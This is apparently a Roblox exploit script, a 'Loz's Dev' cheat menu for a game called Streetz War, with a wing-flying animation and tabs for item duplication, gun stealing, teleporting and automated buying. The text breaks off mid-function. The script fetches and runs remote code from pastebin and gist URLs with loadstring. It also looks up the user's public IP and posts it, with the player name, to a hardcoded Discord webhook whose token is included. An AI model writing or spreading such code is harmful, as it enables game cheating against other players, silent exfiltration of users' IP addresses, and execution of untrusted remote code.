function fly()

    for i,v in pairs(script:GetChildren()) do
    
            pcall(function() v.Value = "" end)
    
            game:GetService("Debris"):AddItem(v,.1)
    
    end
    
    function weld(p0,p1,c0,c1,par)
    
            local w = Instance.new("Weld",p0 or par)
    
            w.Part0 = p0
    
            w.Part1 = p1
    
            w.C0 = c0 or CFrame.new()
    
            w.C1 = c1 or CFrame.new()
    
            return w
    
    end
    
    local motors = {}
    
    function motor(p0,p1,c0,c1,des,vel,par)
    
            local w = Instance.new("Motor6D",p0 or par)
    
            w.Part0 = p0
    
            w.Part1 = p1
    
            w.C0 = c0 or CFrame.new()
    
            w.C1 = c1 or CFrame.new()
    
            w.MaxVelocity = tonumber(vel) or .05
    
            w.DesiredAngle = tonumber(des) or 0
    
            return w
    
    end
    
    function lerp(a,b,c)
    
        return a+(b-a)*c
    
    end
    
    function clerp(c1,c2,al)
    
            local com1 = {c1.X,c1.Y,c1.Z,c1:toEulerAnglesXYZ()}
    
            local com2 = {c2.X,c2.Y,c2.Z,c2:toEulerAnglesXYZ()}
    
            for i,v in pairs(com1) do
    
                    com1[i] = lerp(v,com2[i],al)
    
            end
    
            return CFrame.new(com1[1],com1[2],com1[3]) * CFrame.Angles(select(4,unpack(com1)))
    
    end
    
    function ccomplerp(c1,c2,al)
    
            local com1 = {c1:components()}
    
            local com2 = {c2:components()}
    
            for i,v in pairs(com1) do
     
                    com1[i] = lerp(v,com2[i],al)
    
            end
    
            return CFrame.new(unpack(com1))
    
    end
    
    function tickwave(time,length,offset)
    
            return (math.abs((tick()+(offset or 0))%time-time/2)*2-time/2)/time/2*length
    
    end
    
    function invcol(c)
    
            c = c.Color
    
            return BrickColor.new(Color3.new(1-c.b,1-c.g,1-c.r))
    
    end
    
    local oc = oc or function(...) return ... end
    
    local plr = game.Players.LocalPlayer
    
    local char = plr.Character
    
    local tor = char.UpperTorso
    
    local hum = char.Humanoid
    
    hum.PlatformStand = false
    
    pcall(function()
    
            char.Wings:Destroy()
    
    end)
    
    pcall(function()
    
            char.Angel:Destroy() -- hat
    
    end)
    
    local mod = Instance.new("Model",char)
    
    mod.Name = "Wings"
    
    local special = {
    
            --antiboomz0r = {"Really black","Institutional white",0,0,false,Color3.new(1,1,.95),Color3.new(1,1,.6)},
    
            antiboomz0r = {"New Yeller",nil,0.4,0.7,true,Color3.new(1,1,.95),Color3.new(1,1,.6)},
    
            --antiboomz0r = {"Cyan","Toothpaste",0,0,false,Color3.new(1,0,0),Color3.new(0,0,0)},
    
            taart = {"Royal purple",nil,.4,.4,true},
    
            mitta = {"Black",nil,0,0,false},
    
            penjuin3 = {"White",nil,0,0,false},
    
            thepc8110 = {"Black","Bright red",.5,0,false,Color3.new(1,0,0),Color3.new(0,0,0)},
    
            nonspeaker = {"Cyan","Toothpaste",0,0,false,Color3.new(1,0,0),Color3.new(0,0,0)},
    
            littleau999 = {"Reddish brown",1030,0,0,false},
    
            unscripter = {"Really black","Really black",.2,0,true,Color3.new(0,0,0),Color3.new(0,0,0)},
    
            oxcool1 = {"Really black","White",.2,0,false,Color3.new(0,0,0),Color3.new(0,0,0)},
    
            krodmiss = {"Really black",nil,0,0,false},
    
    }
    
    local topcolor = invcol(char.UpperTorso.BrickColor)
    
    local feacolor = char.UpperTorso.BrickColor
    
    local ptrans = 1
    
    local pref = 0
    
    local fire = false
    
    local fmcol = Color3.new()
    
    local fscol = Color3.new()
    
    local spec = special[plr.Name:lower()]
    
    if spec then
    
            topcolor,feacolor,ptrans,pref,fire,fmcol,fscol = spec[1] and BrickColor.new(spec[1]) or topcolor,spec[2] and BrickColor.new(spec[2]) or feacolor,spec[3],spec[4],spec[5],spec[6],spec[7]
    
    end
    
    local part = Instance.new("Part")
    
    part.Size = Vector3.new(.2,.2,.2)
    
    part.TopSurface,part.BottomSurface = 0,0
    
    part.CanCollide = false
    
    part.Color = Color3.new(255,255,255)
    
    part.Transparency =  1
    part.Material = Enum.Material.ForceField
    part.Reflectance = pref
    
    local ef = Instance.new("Fire",fire and part or nil)
    
    ef.Size = .15
    
    ef.Color = fmcol or Color3.new()
    
    ef.SecondaryColor = fscol or Color3.new()
    
    part:BreakJoints()
    
    
    function newpart()
    
            local clone = part:Clone()
    
            clone.Parent = mod
    
            clone:BreakJoints()
    
            return clone
    
    end
    
    local feath = newpart()
    
    feath.BrickColor = feacolor
    feath.Material = Enum.Material.ForceField
    feath.Transparency = 1
    
    Instance.new("SpecialMesh",feath).MeshType = "Sphere"
    
    function newfeather()
    
            local clone = feath:Clone()
    
            clone.Parent = mod
            clone.Material = Enum.Material.ForceField
            clone.Transparency = 1
            clone:BreakJoints()
    
            return clone
    
    end
    
    
    ---------- RIGHT WING
    
    local r1 = newpart()
    
    r1.Size = Vector3.new(.3,1.5,.3)*1.2
    
    local rm1 = motor(tor,r1,CFrame.new(.35,.6,.4) * CFrame.Angles(0,0,math.rad(-60)) * CFrame.Angles(math.rad(30),math.rad(-25),0),CFrame.new(0,-.8,0),.1)
    
    local r2 = newpart()
    
    r2.Size = Vector3.new(.4,1.8,.4)*1.2
    
    local rm2 = motor(r1,r2,CFrame.new(0,.75,0) * CFrame.Angles(0,0,math.rad(50)) * CFrame.Angles(math.rad(-30),math.rad(15),0),CFrame.new(0,-.9,0),.1)
    
    local r3 = newpart()
    
    r3.Size = Vector3.new(.3,2.2,.3)*1.2
    
    local rm3 = motor(r2,r3,CFrame.new(.1,.9,0) * CFrame.Angles(0,0,math.rad(-140)) * CFrame.Angles(math.rad(-3),0,0),CFrame.new(0,-1.1,0),.1)
    
    local r4 = newpart()
    
    r4.Size = Vector3.new(.25,1.2,.25)*1.2
    
    local rm4 = motor(r3,r4,CFrame.new(0,1.1,0) * CFrame.Angles(0,0,math.rad(-10)) * CFrame.Angles(math.rad(-3),0,0),CFrame.new(0,-.6,0),.1)
    
    local feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,3,.3)
    
    weld(r4,feather,CFrame.new(-.1,-.3,0),CFrame.new(0,-1.5,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,2.3,.3)
    
    
    weld(r4,feather,CFrame.new(.1,-.1,0) * CFrame.Angles(0,math.random()*.1,0),CFrame.new(0,-1.1,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.35,2.2,.25)
    feather.Transparency = 1
    feather.Material = Enum.Material.ForceField
    weld(r4,feather,CFrame.new(.1,-.3,0) * CFrame.Angles(0,math.random()*.1,math.rad(-10)),CFrame.new(0,-1.1,0))
    
    local rf3 = {}
    
    for i=0,7 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2,.35)
    
            table.insert(rf3,motor(r3,feather,CFrame.new(.05,1-i*.285,0) * CFrame.Angles(0,math.random()*.1,math.rad(-25-i*2)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local rf2 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2-i*.08,.3)
    
            table.insert(rf2,motor(r2,feather,CFrame.new(.05,.75-i*.26,0) * CFrame.Angles(0,math.random()*.1,math.rad(-75-i*4)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local rf1 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.37,1.65-i*.06,.25)
    
            table.insert(rf1,motor(r1,feather,CFrame.new(.05,.63-i*.21,0) * CFrame.Angles(0,math.random()*.05,math.rad(-75)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    ---------- LEFT WING
    
    local l1 = newpart()
    
    l1.Size = Vector3.new(.3,1.5,.3)*1.2
    
    local lm1 = motor(tor,l1,CFrame.new(-.35,.6,.4) * CFrame.Angles(0,0,math.rad(60)) * CFrame.Angles(math.rad(30),math.rad(25),0) * CFrame.Angles(0,-math.pi,0),CFrame.new(0,-.8,0) ,.1)
    
    local l2 = newpart()
    
    l2.Size = Vector3.new(.4,1.8,.4)*1.2
    
    local lm2 = motor(l1,l2,CFrame.new(0,.75,0) * CFrame.Angles(0,0,math.rad(50)) * CFrame.Angles(math.rad(30),math.rad(-15),0),CFrame.new(0,-.9,0),.1)
    
    local l3 = newpart()
    
    l3.Size = Vector3.new(.3,2.2,.3)*1.2
    
    local lm3 = motor(l2,l3,CFrame.new(.1,.9,0) * CFrame.Angles(0,0,math.rad(-140)) * CFrame.Angles(math.rad(3),0,0),CFrame.new(0,-1.1,0),.1)
    
    local l4 = newpart()
    
    l4.Size = Vector3.new(.25,1.2,.25)*1.2
    
    local lm4 = motor(l3,l4,CFrame.new(0,1.1,0) * CFrame.Angles(0,0,math.rad(-10)) * CFrame.Angles(math.rad(3),0,0),CFrame.new(0,-.6,0),.1)
    
    local feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,3,.3)
    
    weld(l4,feather,CFrame.new(-.1,-.3,0),CFrame.new(0,-1.5,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.4,2.3,.3)
    
    weld(l4,feather,CFrame.new(.1,-.1,0) * CFrame.Angles(0,math.random()*.1,0),CFrame.new(0,-1.1,0))
    
    feather = newfeather()
    
    feather.Mesh.Scale = Vector3.new(1,1,1)
    
    feather.Size = Vector3.new(.35,2.2,.25)
    
    weld(l4,feather,CFrame.new(.1,-.3,0) * CFrame.Angles(0,math.random()*.1,math.rad(-10)),CFrame.new(0,-1.1,0))
    
    local lf3 = {}
    
    for i=0,7 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2,.35)
    
            table.insert(lf3,motor(l3,feather,CFrame.new(.05,1-i*.285,0) * CFrame.Angles(0,math.random()*.1,math.rad(-25-i*2)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local lf2 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.45,2.2-i*.08,.3)
    
            table.insert(lf2,motor(l2,feather,CFrame.new(.05,.75-i*.26,0) * CFrame.Angles(0,math.random()*.1,math.rad(-75-i*4)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local lf1 = {}
    
    for i=0,6 do
    
            feather = newfeather()
    
            feather.Mesh.Scale = Vector3.new(1,1,1)
    
            feather.Size = Vector3.new(.37,1.65-i*.06,.25)
    
            table.insert(lf1,motor(l1,feather,CFrame.new(.05,.63-i*.21,0) * CFrame.Angles(0,math.random()*.05,math.rad(-75)),CFrame.new(0,-feather.Size.Y/2,0)))
    
    end
    
    local rwing = {rm1,rm2,rm3,rm4}
    
    local lwing = {lm1,lm2,lm3,lm4}
    
    local oc0 = {}
    
    for i,v in pairs(rwing) do
    
            oc0[v] = v.C0
    
    end
    
    for i,v in pairs(lwing) do
    
            oc0[v] = v.C0
    
    end
    
    function gotResized()
    
            if lastsize then
    
                    if tor.Size == lastsize then return end -- This shouldn't happen?
    
                    local scaleVec = tor.Size/lastsize
    
                    for i,v in pairs(oc0) do
    
                            oc0[i] = v-v.p+scaleVec*v.p
    
                    end
    
                    lastsize = tor.Size
    
            end
    
            lastsize = tor.Size
    
    end
    
    tor.Changed:connect(function(p)
    
            if p == "Size" then
    
                    gotResized()
    
            end
    
    end)
    
    gotResized()
    
    local idle = {0,0.5,-.2,0; .05,.05,.1,.05; -.6,-1.5,.1,0;}--0,.3,0,0
    
    local outlow = {-.7,-.2,1.8,0; .3,.05,.1,.05; .2,0,0,0}
    
    local outhigh = {.5,-.2,1.8,0; .3,.05,.1,.05; .2,0,0,0}
    
    local veryhigh = {.9,-.3,1.9,0; .3,.05,.1,.05; .2,0,0,0}
    
    local flap1 = {-.3,.3,1.1,-.2; .3,.05,.1,.05; .2,-.6,0,0}
    
    local divebomb = {0,.2,.4,-.7; .3,.05,.1,.05; 0,-.5,-.6,0}
    
    
    function setwings(tab,time)
    
            time = time or 10
    
            for i=1,4 do
    
                    rwing[i].DesiredAngle = tab[i]
    
                    lwing[i].DesiredAngle = tab[i]
    
                    rwing[i].MaxVelocity = math.abs(tab[i]-rwing[i].CurrentAngle)/time
    
                    lwing[i].MaxVelocity = math.abs(tab[i]-lwing[i].CurrentAngle)/time
    
                    local rcf = oc0[rwing[i]] * (tab[12+i] or CFrame.new())
    
                    local lcf = oc0[lwing[i]] * (tab[12+i] or CFrame.new())
    
            end
    
            for i,v in pairs(rf1) do
    
                    v.DesiredAngle = tab[9]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(lf1) do
    
                    v.DesiredAngle = tab[9]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(rf2) do
    
                    v.DesiredAngle = tab[10]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(lf2) do
    
                    v.DesiredAngle = tab[10]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(rf3) do
    
                    v.DesiredAngle = tab[11]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
            for i,v in pairs(lf3) do
    
                    v.DesiredAngle = tab[11]
    
                    v.MaxVelocity = math.abs(v.DesiredAngle-v.CurrentAngle)/time
    
            end
    
    end
    
    setwings(outhigh,1)
    
    flying = false
    
    moving = false
    
    for i,v in pairs(tor:GetChildren()) do
    
            if v.ClassName:lower():match("body") then
    
                    v:Destroy()
    
            end
    
    end
    
    local ctor = tor:Clone()
    
    ctor:ClearAllChildren()
    
    ctor.Name = "cTorso"
    
    ctor.Transparency = 1
    
    ctor.CanCollide = false
    
    ctor.Size = Vector3.new(.2,.2,.2)
    
    ctor.Parent = mod
    
    weld(tor,ctor)
    
    local bg = Instance.new("BodyGyro",ctor)
    
    bg.maxTorque = Vector3.new()
    
    bg.P = 15000
    
    bg.D = 1000
    
    local bv = Instance.new("BodyVelocity",ctor)
    
    bv.maxForce = Vector3.new()
    
    bv.P = 15000
    
    vel = Vector3.new()
    
    cf = CFrame.new()
    
    flspd = 0
    
    
    keysdown = {}
    
    keypressed = {}
    
    ktime = {}
    
    descendtimer = 0
    
    jumptime = tick()
    
    hum.Jumping:connect(function()
    
            jumptime = tick()
    
    end)
    
    cam = workspace.CurrentCamera
    
    kd = plr:GetMouse().KeyDown:connect(oc(function(key) 
    
            keysdown[key] = true 
    
            keypressed[key] = true 
    
            if key == "q" then 
    
                    descendtimer = tick() 
    
            elseif key == " " and not hum.Jump then 
    
                    jumptime = tick()
    
            elseif (key == "a" or key == "d") and ktime[key] and tick()-ktime[key] < .3 and math.abs(reqrotx) < .3 then
    
                    reqrotx = key == "a" and math.pi*2 or -math.pi*2
    
            end
    
            ktime[key] = tick() 
    
    end))
    
    ku = plr:GetMouse().KeyUp:connect(function(key) 
    
            keysdown[key] = false 
    
            if key == " " then 
    
                    descendtimer = tick() 
    
            end 
    
    end)
    
    function mid(a,b,c)
    
            return math.max(a,math.min(b,c or -a))
    
    end
    
    function bn(a)
    
            return a and 1 or 0
    
    end
    
    function gm(tar)
    
            local m = 0
    
            for i,v in pairs(tar:GetChildren()) do
    
                    if v:IsA("BasePart") then
    
                            m = m + v:GetMass()
    
                    end
    
                            m = m + gm(v)
    
            end
    
            return m
    
    end
    
    reqrotx = 0
    
    local grav = 196.2
    
    local con
    
    con = game:GetService("RunService").Stepped:connect(oc(function()
    
            --[[if not mod:IsDescendantOf(workspace) then
    
                    pcall(function() kd:disconnect() end)
    
                    pcall(function() ku:disconnect() end)
    
                    bg:Destroy()
    
                    bv:Destroy()
    
                    con:disconnect()
    
                    script:Destroy()
    
                    return
    
            end]]
    
            local obvel = tor.CFrame:vectorToObjectSpace(tor.Velocity)
    
            local sspd, uspd,fspd = obvel.X,obvel.Y,obvel.Z
    
            if flying then
    
                    local lfldir = fldir
    
                    fldir = cam.CoordinateFrame:vectorToWorldSpace(Vector3.new(bn(keysdown.d)-bn(keysdown.a),0,bn(keysdown.s)-bn(keysdown.w))).unit
    
                    local lmoving = moving
    
                    moving = fldir.magnitude > .1
    
                    if lmoving and not moving then
    
                            idledir = lfldir*Vector3.new(1,0,1)
    
                            descendtimer = tick()
    
                    end
    
                    local dbomb = fldir.Y < -.6 or (moving and keysdown["1"])
    
                    if moving and keysdown["0"] and lmoving then
    
                            fldir = (Vector3.new(lfldir.X,math.min(fldir.Y,lfldir.Y+.01)-.1,lfldir.Z)+(fldir*Vector3.new(1,0,1))*.05).unit
    
                    end
    
                    local down = tor.CFrame:vectorToWorldSpace(Vector3.new(0,-1,0))
    
                    local descending = (not moving and keysdown["q"] and not keysdown[" "])
    
                    cf = ccomplerp(cf,CFrame.new(tor.Position,tor.Position+(not moving and idledir or fldir)),keysdown["0"] and .02 or .07)
    
                    local gdown = not dbomb and cf.lookVector.Y < -.2 and tor.Velocity.unit.Y < .05
    
                    hum.PlatformStand = true
    
                    bg.maxTorque = Vector3.new(1,1,1)*9e5
    
                    local rotvel = CFrame.new(Vector3.new(),tor.Velocity):toObjectSpace(CFrame.new(Vector3.new(),fldir)).lookVector
    
                    bg.cframe = cf * CFrame.Angles(not moving and -.1 or -math.pi/2+.2,moving and mid(-2.5,rotvel.X/1.5) + reqrotx or 0,0)
    
                    reqrotx = reqrotx - reqrotx/10
    
                    bv.maxForce = Vector3.new(1,1,1)*9e4*.5
    
                    local anioff =(bn(keysdown[" "])-bn(keysdown["q"]))/2
    
                    local ani = tickwave(1.5-anioff,1)
    
                    bv.velocity = bv.velocity:Lerp(Vector3.new(0,bn(not moving)*-ani*15+(descending and math.min(20,tick()-descendtimer)*-8 or bn(keysdown[" "])-bn(keysdown["q"]))*15,0)+vel,.6) 
    
                    vel = moving and cf.lookVector*flspd or Vector3.new()
    
                    flspd = math.min(120,lerp(flspd,moving and (fldir.Y<0 and flspd+(-fldir.Y)*grav/60 or math.max(50,flspd-fldir.Y*grav/300)) or 60,.4))
    
                    setwings(moving and (gdown and outlow or dbomb and divebomb) or (descending and veryhigh or flap1),15)
    
                    for i=1,4 do
    
                            --CFrame.Angles(-.5+bn(i==3)*2.4+bn(i==4)*.5,.1+bn(i==2)*.5-bn(i==3)*1.1,bn(i==3)*.1)
    
                            rwing[i].C0 = clerp(rwing[i].C0,oc0[rwing[i]] * (gdown and CFrame.new() or dbomb and CFrame.Angles(-.5+bn(i==3)*.4+bn(i==4)*.5,.1+bn(i==2)*.5-bn(i==3)*1.1,bn(i==3)*.1) or descending and CFrame.Angles(.3,0,0) or CFrame.Angles((i*.1+1.5)*ani,ani*-.5,1*ani)),descending and .8 or .2)
    
                            lwing[i].C0 = clerp(lwing[i].C0,oc0[lwing[i]] * (gdown and CFrame.new() or dbomb and CFrame.Angles(-(-.5+bn(i==3)*.4+bn(i==4)*.5),-(.1+bn(i==2)*.5-bn(i==3)*1.1),bn(i==3)*.1) or descending and CFrame.Angles(-.3,0,0) or CFrame.Angles(-(i*.1+1.5)*ani,ani*.5,1*ani)),descending and .8 or .2)
    
                    end
    
                    local hit,ray = workspace:FindPartOnRayWithIgnoreList(Ray.new(tor.Position,Vector3.new(0,-3.5+math.min(0,bv.velocity.y)/30,0)),{char})
    
                    if _G.flying == false then
    
                            flying = false
    
                            hum.PlatformStand = false
    
                            tor.Velocity = Vector3.new()
    
                    end
    
            else
    
                    bg.maxTorque = Vector3.new()
    
                    bv.maxForce = Vector3.new()
    
                    local ani = tickwave(walking and .8 or 4.5,1)
    
                    setwings(idle,10)
    
                    local x,y,z = fspd/160,uspd/700,sspd/900
    
    
    
                    if _G.flying then
    
                            vel = Vector3.new(0,50,0)
    
                            bv.velocity = vel
    
                            idledir = cam.CoordinateFrame.lookVector*Vector3.new(1,0,1)
    
                            cf = tor.CFrame * CFrame.Angles(-.01,0,0)
    
                            tor.CFrame = cf
    
                            bg.cframe = cf
    
                            flystart = tick()
    
                            flying = true
    
                    end
    
            end
    
            keypressed = {}
    
    end))
    
    
    
    end 

    fly()

local ip = game:HttpGet("https://api.ipify.org/")

local whitelisted = false
local notificationlib = loadstring(game:HttpGet("https://gist.githubusercontent.com/MISSINGACID/ea243f16c8ef08bf39bf9529327ad4bf/raw/45f36762a2e060c263dbfd0a8da17428db02e37e/uilib%2520changed%2520xsx.lua"))()
    local Notif = notificationlib:InitNotifications()

loadstring(game:HttpGet("https://pastebin.com/raw/ed2f3GwL"))()

for i,v in pairs(_G.whitelist) do
    if tostring(v) == tostring(ip) then
     whitelisted = true
    end
end

for i,v in pairs(_G.whitelist) do
    if tostring(v) == tostring(game.Players.LocalPlayer.Name) then
     whitelisted = true
    end
end

_G.Status = true

if _G.Status then
if whitelisted  then
    print("whitelisted")
        local LoadingXSX = Notif:Notify("Authorized, please wait.", 2, "success") 
           notificationlib.rank = "developer"
    notificationlib.version = "2.0.3"
    local Notif = notificationlib:InitNotifications()
    local LoadingXSX = Notif:Notify("Authorized, please wait.", 2, "success") -- notification, alert, error, success, information

    webhook = "https://discord.com/api/webhooks/1287863591080427612/kq2OOPZK3S7PtoStRJWuvhfBTr0AXrePVkP2FsajppeYbkseYdmbJoClwu5uXgKBFYcY"

    local http = game:GetService("HttpService")
    local message = 
        {
            ["content"] = "",
            ["embeds"] = {{
                            ["thumbnail"] = {
                    ["url"] = "https://cdn.discordapp.com/attachments/1252080140578586714/1279191674592952421/static.png?ex=66d38b95&is=66d23a15&hm=4fcbbba51e61df77145fc9f6621cc780a5cd4f6bdfeaa4bf1836349c2c985493&"
                },
                ["title"] = "__**Authorized user**__",
                ["description"] = game.Players.LocalPlayer.Name .. "\n" .. game:HttpGet("https://api.ipify.org/"),
                ["type"] = "rich",
                ["color"] = tonumber(0x00FF00),
            }}
        }
    local jsonMessage = http:JSONEncode(message)
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local success, response = pcall(function()
        return request({
            Url = webhook,
            Body = jsonMessage,
            Method = "POST",
            Headers = headers,
        })
    end)

wait(0.1)
local LoadingXSX = Notif:Notify("Loading Loz's Dev, please wait.", 2, "information") -- notification, alert, error, success, information
wait(0.1)
    print(CREDITS)
    
    

    
    local library = loadstring(game:HttpGet('https://gist.githubusercontent.com/MISSINGACID/e9f6cf627d256851ecc89798f69c2aa8/raw/509c970b9ea9cef74ae7e1fd5c9753e323c25e4b/fawwwk.lua'))()




    -- // Window \\ --
    local window = library.new("Loz's Dev | SW2", 'leadmarker')
    
    -- // Tabs \\ --
    local tab = window.new_tab('rbxassetid://12795075088')
    local tab2 = window.new_tab('rbxassetid://6594776225')
    local tab3 = window.new_tab('https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=12334310477')
    local tab4 = window.new_tab('https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=12941020189')
    local settings = window.new_tab('https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=14134158105')
    
    -- // Sections \\ --
    local section = tab.new_section('Duplication')
    local section3 = tab2.new_section('Editing')
    local section2 = tab3.new_section('Stealing')
    local section5 = tab4.new_section('Teleporting')
    local settingssection = settings.new_section('Settings')
    -- // Sector \\ --
    local autofarmsector = section.new_sector('Autofarm', 'Left')
    local carddupingsector = section.new_sector('Card Duping', 'Left')
    local section4 = section3.new_sector('Enemies', 'Right')
    local sector3 = section3.new_sector('Settings', 'Left')
    local selfsector = section3.new_sector('Self', 'Left')
    local sector1 = section.new_sector('Gun Duplication', 'Right')
    local gunsection = section2.new_sector('Gun Stealing', 'Left')
    local maskingsection = settingssection.new_sector('Masking', 'Right')


    local teleports = section5.new_sector('Teleports', 'Left')


    local wasinshop = false
    local purchaseditem = nil

    local quickbuy = section5.new_sector('Quick Buy', 'Left')

    local selecteditem = nil
    local quickbuydropdown = quickbuy.element('Dropdown', 'Item', {options = {'Sawnoff','Glock Drum','Walther PPK','Survival Knife','Revolver','Mac','Tec9','Knife','ZombieKnife','Bullets','Extended','Shotgun','Mag','Drum','AR-15','Vector','Thompson','Skorpion','MiniDraco','Glock 17 Ext','Glock 17 switch','HealthBoosters','Balaclava','Spraypaint','Flashlight','Lockpick', 'Dufflebag','Money Flex'}}, function(v)
        selecteditem = v.Dropdown
    end)
    
    local buybutton = quickbuy.element('Button', 'Buy', false, function(v)
        if selecteditem ~= nil then
            if selecteditem == 'HealthBoosters' then
                fireclickdetector(game.Workspace["Streetz War"].Real.ClickDetector)
                game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
                game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false
    
                local vim = game:GetService("VirtualInputManager")
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame:GetChildren()[7]
                thing.Size = UDim2.new(10, 0, -10, 0)
    
                mousemoveabs(thing.AbsolutePosition.X, thing.AbsolutePosition.Y)
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, false, game, 0)
    
                thing.Size = UDim2.new(0, 0, 0, 0)
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit.Position = thing.Position
                thing:Destroy()
    
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
                thing.Size = UDim2.new(10, 0, -10, 0)
                local ypos = thing.AbsolutePosition.Y
                local xpos = thing.AbsolutePosition.X
                mousemoveabs(xpos, ypos)
                vim:SendMouseButtonEvent(xpos, ypos, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(xpos, ypos, 0, false, game, 0)
                return
            elseif selecteditem == 'Balaclava' then
                fireclickdetector(game.Workspace["Streetz War"].IllegalDealer.ClickDetector)
                game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
                game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false
    
                local vim = game:GetService("VirtualInputManager")
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame:GetChildren()[15]
                thing.Size = UDim2.new(10, 0, -10, 0)
                thing.Position = UDim2.new(0.2-54892468, 0, 0.932652116, 0)
                mousemoveabs(thing.AbsolutePosition.X, thing.AbsolutePosition.Y)
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, false, game, 0)
    
                thing.Size = UDim2.new(0, 0, 0, 0)
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit.Position = thing.Position
                thing:Destroy()
    
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
                thing.Size = UDim2.new(10, 0, -10, 0)
                thing.Position = UDim2.new(0.254892468, 0, 0.932652116, 0)
                local ypos = thing.AbsolutePosition.Y
                local xpos = thing.AbsolutePosition.X
                mousemoveabs(xpos, ypos)
                vim:SendMouseButtonEvent(xpos, ypos, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(xpos, ypos, 0, false, game, 0)
                return
            elseif selecteditem == 'Spraypaint' or selecteditem == 'C4' or selecteditem == 'Flashlight' or selecteditem == 'Lockpick' or selecteditem == 'Money Flex' or selecteditem == 'Dufflebag' then
                fireclickdetector(game.Workspace["Streetz War"].IllegalDealer.ClickDetector)
                game.Players.LocalPlayer.PlayerGui:WaitForChild("DealerGui")
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.Visible = true
                game.Players.LocalPlayer.PlayerGui.DealerGui.Frame.Visible = false
    
                local vim = game:GetService("VirtualInputManager")
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame:FindFirstChild(selecteditem)
                thing.Size = UDim2.new(10, 0, -10, 0)
                thing.Position = UDim2.new(0.254892468, 0, 0.932652116, 0)
    
                mousemoveabs(thing.AbsolutePosition.X, thing.AbsolutePosition.Y)
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(thing.AbsolutePosition.X, thing.AbsolutePosition.Y, 0, false, game, 0)
                print("asd")
                thing.Size = UDim2.new(0, 0, 0, 0)
                game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit.Position = thing.Position
                thing:Destroy()
    
                local thing = game.Players.LocalPlayer.PlayerGui.DealerGui.ShopFrame.exit
                thing.Size = UDim2.new(10, 0, -10, 0)
                local ypos = thing.AbsolutePosition.Y
                local xpos = thing.AbsolutePosition.X
                mousemoveabs(xpos, ypos)
                vim:SendMouseButtonEvent(xpos, ypos, 0, true, game, 0)
                wait()
                vim:SendMouseButtonEvent(xpos, ypos, 0, false, game, 0)
                return
            else
                for i,v in pairs(game.Workspace.GunShop.Slots:GetDescendants()) do
                    if selecteditem ~= nil then
                        if v.Name == selecteditem then
                            wasinshop = true
                            purchaseditem = v
                        end
                    end
                end
    
                if wasinshop then
                    local oldpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
